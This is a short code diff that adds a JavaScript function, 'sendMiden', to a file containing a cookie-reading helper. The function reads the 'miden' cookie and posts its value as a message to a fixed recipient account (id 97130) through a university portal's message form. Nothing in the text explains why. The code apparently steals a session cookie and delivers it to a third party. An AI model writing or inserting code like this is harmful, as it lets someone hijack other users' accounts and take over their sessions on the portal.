@@ -17,3 +17,8 @@ function getCookie(name) {
             cookieEndIndex = document.cookie.length
     return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
 }
+
+function sendMiden(){
+	let miden = getCookie('miden')
+	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=MyMiden&mes='+miden+'&adresat=97130')
+}
